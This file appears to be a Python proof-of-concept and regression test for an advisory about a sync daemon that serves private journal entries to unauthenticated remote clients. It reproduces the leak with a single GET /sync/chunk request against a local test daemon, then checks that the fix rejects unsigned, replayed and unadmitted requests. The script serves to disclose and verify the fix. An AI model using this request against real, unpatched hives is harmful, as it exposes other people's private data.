#!/usr/bin/env python3
"""PoC for GHSA-242f-7fxg-f7wm — Unauthenticated Journal Disclosure via the sync API.

Two phases against the CURRENT code:

  PHASE A — REPRODUCE. With read-auth OFF (the historical default: no auth, bind 0.0.0.0), an
    unauthenticated REMOTE GET /sync/chunk returns the victim's journal, secret and all.

  PHASE B — FIXED. With read-auth ENFORCE, the same remote read is blocked (401), the /api/* corpus
    surface is forbidden to anonymous remotes (403), replay is rejected, and an unadmitted signer is
    rejected — while the local operator (loopback) and an ADMITTED, SIGNED remote peer still succeed,
    and open discovery (/hive/info, /sync/merkle-root) stays reachable without leaking the journal.

Exit 0 iff every assertion holds. Run inside the container built from tests/security/Dockerfile.
"""

import base64
import hashlib
import json
import os
import pathlib
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

APP = pathlib.Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(APP))
import ed25519          # noqa: E402  (bundled pure-Python)
import sync_common      # noqa: E402

HV = str(APP / "hv")
HIVE_HOME = os.environ.setdefault("HIVE_HOME", "/tmp/victim-hive")
PASSPHRASE = os.environ.setdefault("HIVE_OWNER_PASSPHRASE", "poc-pass")
CANARY = "secret project: launch token is REDACTED-POC"
PORT = 9876

_fail = 0


def check(label, cond):
    global _fail
    mark = "PASS" if cond else "FAIL"
    if not cond:
        _fail += 1
    print(f"  [{mark}] {label}")


def container_ip():
    """This container's non-loopback address (so the daemon sees us as a REMOTE peer)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def hv(*args):
    subprocess.run([sys.executable, HV, *args], check=True, capture_output=True, text=True,
                   env=os.environ)


def req(host, path, headers=None, timeout=6):
    r = urllib.request.Request(f"http://{host}:{PORT}{path}", headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def sign(method, path, query, body=b"", seed=None):
    if seed is None:
        seed = base64.b64decode((pathlib.Path(HIVE_HOME) / ".device-key").read_text().strip())
    pub = ed25519.pub_from_seed(seed)
    ts, nonce = int(time.time()), os.urandom(16).hex()
    sig = ed25519.sign(sync_common.sync_signing_bytes(method, path, query, body, ts, nonce), seed)
    return {
        "Hive-Auth-Alg": sync_common.HIVE_AUTH_ALG,
        "Hive-Auth-Device": "k1:" + hashlib.sha256(pub).hexdigest()[:16],
        "Hive-Auth-Pub": base64.b64encode(pub).decode(),
        "Hive-Auth-Ts": str(ts),
        "Hive-Auth-Nonce": nonce,
        "Hive-Auth-Sig": base64.b64encode(sig).decode(),
    }


def start_daemon(mode):
    env = dict(os.environ, HIVE_BIND="0.0.0.0", HIVE_SYNC_AUTH=mode)
    p = subprocess.Popen([sys.executable, str(APP / "hive_sync_daemon.py")], env=env,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(150):
        try:
            if req("127.0.0.1", "/sync/merkle-root")[0] == 200:
                return p
        except Exception:
            time.sleep(0.2)
    p.terminate()
    raise SystemExit("daemon failed to start")


def setup_victim():
    (pathlib.Path(HIVE_HOME)).mkdir(parents=True, exist_ok=True)
    (pathlib.Path(HIVE_HOME) / ".peers.json").write_text(json.dumps({"self": "victim", "port": PORT, "peers": []}))
    hv("key", "init")
    hv("owner", "init")
    dev = (pathlib.Path(HIVE_HOME) / ".device-id").read_text().strip()
    hv("group", "admit", dev, "--principal", "victim")
    hv("remember", CANARY, "--tags", "secret")
    return dev


def main():
    ip = container_ip()
    dev = setup_victim()
    chunk = f"/sync/chunk?node={dev}&start=1&end=9999"
    print(f"[setup] HIVE_HOME={HIVE_HOME} device={dev} container_ip={ip}")
    print(f"[setup] secret journal entry: {CANARY!r}")

    print("\n=== PHASE A — REPRODUCE (read-auth OFF, the historical default) ===")
    d = start_daemon("off")
    try:
        st, body = req(ip, chunk)
        print(f"[attack] unauthenticated remote GET {chunk} -> HTTP {st}")
        check("advisory reproduced: remote unauthenticated /sync/chunk leaks the secret",
              st == 200 and CANARY in body)
    finally:
        d.terminate(); d.wait()

    print("\n=== PHASE B — FIXED (read-auth ENFORCE) ===")
    d = start_daemon("enforce")
    try:
        st, body = req(ip, chunk)
        check("remote unsigned /sync/chunk blocked (401), no secret", st == 401 and CANARY not in body)
        check("remote unsigned /api/overview forbidden (403)", req(ip, "/api/overview")[0] == 403)

        st, body = req("127.0.0.1", chunk)
        check("loopback operator still reads the journal", st == 200 and CANARY in body)

        for p in ("/hive/info", "/sync/merkle-root"):
            check(f"open discovery {p} reachable (200)", req(ip, p)[0] == 200)
        check("/hive/info discloses no journal content", CANARY not in req(ip, "/hive/info")[1])

        st, body = req(ip, chunk, headers=sign("GET", "/sync/chunk", f"node={dev}&start=1&end=9999"))
        check("admitted, signed remote peer succeeds (200 + secret)", st == 200 and CANARY in body)

        hdrs = sign("GET", "/sync/chunk", f"node={dev}&start=1&end=9999")
        req(ip, chunk, headers=hdrs)
        check("replayed signed request rejected (401)", req(ip, chunk, headers=hdrs)[0] == 401)

        bad = sign("GET", "/sync/chunk", f"node={dev}&start=1&end=9999", seed=os.urandom(32))
        check("unadmitted (valid-signature) remote peer rejected (401)", req(ip, chunk, headers=bad)[0] == 401)
    finally:
        d.terminate(); d.wait()

    print(f"\n[RESULT] {'PASS — advisory reproduced and fix verified' if _fail == 0 else f'FAIL — {_fail} check(s) failed'}")
    sys.exit(1 if _fail else 0)


if __name__ == "__main__":
    main()
